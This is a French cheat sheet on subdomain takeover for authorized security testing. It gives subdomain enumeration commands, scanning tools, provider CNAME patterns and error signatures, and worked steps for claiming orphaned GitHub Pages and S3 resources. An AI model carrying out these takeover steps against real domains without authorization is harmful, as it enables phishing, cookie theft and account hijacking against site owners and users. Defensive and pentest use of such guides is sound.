# 🎯 Fiche pratique de prise de contrôle de sous-domaines

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
  ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
  ███████╗██║   ██║██████╔╝██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
  ╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
  ███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
  ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                ████████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
                ╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗
                   ██║   ███████║█████╔╝ █████╗  ██║   ██║██║   ██║█████╗  ██████╔╝
                   ██║   ██╔══██║██╔═██╗ ██╔══╝  ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
                   ██║   ██║  ██║██║  ██╗███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝
```

---

> **Interprétation et versions :** les motifs CNAME, messages d’erreur et procédures ci-dessous sont ceux du document source, pas une liste actuelle de ressources réattribuables. Une signature HTTP ou un enregistrement orphelin est une piste à confirmer ; créer une ressource portant un nom similaire ne garantit pas la maîtrise du domaine. Les règles de validation et les protections varient selon le fournisseur.
>
> **Exemples GitHub et CloudFront :** la [vérification de domaine GitHub Pages](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages) peut protéger un domaine et ses sous-domaines immédiats contre la réattribution. CloudFront exige notamment un [certificat valide couvrant le domaine alternatif](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html) : le seul message « Bad Request » ne démontre pas une prise de contrôle possible. Les chemins de modèles, noms de dépôts, ressources et exemples d’hébergement restent inchangés.
>
> **Portée des résultats :** les cookies accessibles dépendent de leur portée et de leurs attributs ; un retour OAuth n’implique pas automatiquement une prise de contrôle de compte. Le mode `crt` de dnsrecon collecte des informations de transparence des certificats, plutôt qu’un inventaire complet des CNAME ; voir le [code officiel de dnsrecon](https://github.com/darkoperator/dnsrecon/blob/master/dnsrecon/cli.py). Les signatures littérales, commandes et texte ASCII restent ceux de la source. Aucun service n’a été interrogé ni aucune ressource réclamée.

## 🎯 Qu’est-ce qu’une prise de contrôle de sous-domaine

Une **prise de contrôle de sous-domaine** (subdomain takeover) peut survenir lorsqu’un sous-domaine pointe vers un service supprimé, par exemple via un CNAME, et qu’un tiers peut réattribuer la ressource pour y publier du contenu.

### Conséquences
- 🔴 **Hameçonnage** — Héberger des pages de hameçonnage crédibles
- 🔴 **Vol de cookies** — Accéder à certains cookies définis pour le domaine parent
- 🔴 **Prise de contrôle de compte** — Intercepter des retours OAuth
- 🔴 **Atteinte à la réputation** — Publier du contenu malveillant

---

## 🔍 Méthodologie de détection

### Étape 1 : énumérer les sous-domaines
```bash
# Utiliser plusieurs outils pour améliorer la couverture
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
assetfinder --subs-only target.com >> subs.txt

# Fusionner et supprimer les doublons
cat subs.txt amass.txt | sort -u > all_subs.txt
```

### Étape 2 : rechercher les CNAME
```bash
# Examiner les enregistrements DNS
cat all_subs.txt | while read sub; do
    cname=$(dig CNAME +short $sub)
    if [ ! -z "$cname" ]; then
        echo "$sub -> $cname"
    fi
done

# Ou utiliser dnsrecon
dnsrecon -d target.com -t crt
```

### Étape 3 : rechercher les CNAME orphelins
```bash
# Vérification manuelle
dig CNAME subdomain.target.com +short
# Renvoie : something.cloudfront.net
# Vérifier ensuite si la ressource du service n’est pas attribuée

# Utiliser httpx pour afficher les codes de statut
cat all_subs.txt | httpx -status-code -title -tech-detect -no-color
```

---

## 🛠️ Outils automatisés

### Subjack
```bash
# Installer
go install github.com/haccer/subjack@latest

# Analyser
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# Avec des signatures de reconnaissance
subjack -w subdomains.txt -t 100 -a -timeout 30 -o results.txt -ssl
```

### Nuclei (modèles de prise de contrôle)
```bash
# Utiliser les modèles nuclei
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/ -o takeovers.txt

# Vérifications ciblées de prise de contrôle
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/subdomain-takeover.yaml
```

### Can-I-Take-Over-XYZ
```bash
# Consulter le dépôt GitHub pour les signatures de reconnaissance
# https://github.com/EdOverflow/can-i-take-over-xyz

# Utiliser les signatures manuellement ou avec des outils automatisés
```

---

## 📋 Services et signatures de reconnaissance du document source

### AWS S3
```
CNAME: bucket.s3.amazonaws.com
CNAME: bucket.s3-website-region.amazonaws.com

Signature : "NoSuchBucket"
Signature : "The specified bucket does not exist"

Prise de contrôle : créer un bucket portant le même nom
```

### AWS CloudFront
```
CNAME: xxxxx.cloudfront.net

Signature : "Bad Request"
Signature : "ERROR: The request could not be satisfied"

Prise de contrôle : créer une distribution CloudFront avec le même domaine alternatif
```

### GitHub Pages
```
CNAME: username.github.io
CNAME: organization.github.io

Signature : "There isn't a GitHub Pages site here"

Prise de contrôle :
1. Créer le dépôt username.github.io
2. Ajouter un fichier CNAME contenant le sous-domaine cible
```

### Heroku
```
CNAME: xxx.herokuapp.com
CNAME: xxx.herokudns.com

Signature : "No such app"
Signature : "There's nothing here, yet"

Prise de contrôle : créer une application Heroku portant le même nom
```

### Azure
```
CNAME: xxx.azurewebsites.net
CNAME: xxx.cloudapp.azure.com
CNAME: xxx.blob.core.windows.net

Signature : "404 - Web Site not found"

Prise de contrôle : créer une ressource portant le même nom
```

### Shopify
```
CNAME: shops.myshopify.com

Signature : "Sorry, this shop is currently unavailable"
Signature : "Only one step left"

Prise de contrôle : créer une boutique Shopify et ajouter le domaine personnalisé
```

### WordPress.com
```
CNAME: xxx.wordpress.com

Signature : "Do you want to register *.wordpress.com?"

Prise de contrôle : enregistrer le sous-domaine sur WordPress.com
```

### Zendesk
```
CNAME: xxx.zendesk.com

Signature : "Help Center Closed"
Signature : "This help center no longer exists"

Prise de contrôle : pas toujours possible, selon la configuration de Zendesk
```

### Fastly
```
CNAME: xxx.fastly.net

Signature : "Fastly error: unknown domain"

Prise de contrôle : ajouter le domaine à un service Fastly
```

### Pantheon
```
CNAME: xxx.pantheonsite.io

Signature : "The gods are wise but do not know of the site"
Signature : "404 error unknown site!"

Prise de contrôle : ajouter un site sur Pantheon
```

---

## 🔥 Étapes d’exploitation

### Exemple : prise de contrôle avec GitHub Pages

```bash
# 1. Rechercher un sous-domaine potentiellement vulnérable
dig CNAME blog.target.com
# Renvoie : target.github.io (mais le dépôt n’existe pas)

# 2. Créer un dépôt GitHub
# Créer : yourusername/target (ou org/target)

# 3. Activer GitHub Pages dans les paramètres du dépôt

# 4. Ajouter un fichier CNAME contenant :
blog.target.com

# 5. Attendre la propagation DNS

# 6. Vérifier la prise de contrôle
curl https://blog.target.com
```

### Exemple : prise de contrôle avec S3

```bash
# 1. Confirmer la vulnérabilité
dig CNAME assets.target.com
# Renvoie : assets-target.s3.amazonaws.com

curl http://assets-target.s3.amazonaws.com
# Renvoie : NoSuchBucket

# 2. Créer un bucket S3 (dans la même région)
aws s3 mb s3://assets-target --region us-east-1

# 3. Configurer le bucket
# Ajouter l’hébergement de site web ou l’accès public

# 4. Téléverser du contenu
echo "Subdomain Takeover PoC" > index.html
aws s3 cp index.html s3://assets-target/

# 5. Vérifier
curl http://assets.target.com
```

---

## 📊 Référence rapide

### Détection des services potentiellement vulnérables

| Service | Motif du CNAME | Signature de reconnaissance |
|---------|---------------|-------------|
| AWS S3 | `*.s3.amazonaws.com` | NoSuchBucket |
| CloudFront | `*.cloudfront.net` | Bad Request |
| GitHub | `*.github.io` | No GitHub Pages |
| Heroku | `*.herokuapp.com` | No such app |
| Azure | `*.azurewebsites.net` | 404 Web Site not found |
| Shopify | `shops.myshopify.com` | Shop unavailable |

### Liste de contrôle de la prise de contrôle

```markdown
- [ ] Énumérer tous les sous-domaines
- [ ] Repérer les CNAME
- [ ] Rechercher les enregistrements orphelins
- [ ] Comparer les signatures de reconnaissance
- [ ] Vérifier que la ressource n’est pas attribuée
- [ ] Tenter une prise de contrôle dans le cadre autorisé
- [ ] Documenter et signaler les résultats
```

---

## 🛠️ Synthèse des outils

| Outil | Utilité |
|------|---------|
| **subjack** | Détection automatisée de prises de contrôle potentielles |
| **nuclei** | Analyse fondée sur des modèles |
| **can-i-take-over-xyz** | Référence des signatures de reconnaissance |
| **dnsrecon** | Énumération DNS |
| **subfinder** | Découverte de sous-domaines |
| **httpx** | Vérifications HTTP |

---

## 📚 Ressources

- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Subjack](https://github.com/haccer/subjack)
- [Modèles Nuclei de prise de contrôle](https://github.com/projectdiscovery/nuclei-templates/tree/main/takeovers)

---

<p align="center">
  <b>🎯 Analysez les prises de contrôle potentielles de sous-domaines !</b><br>
  <i>Uniquement dans le cadre de tests autorisés !</i>
</p>
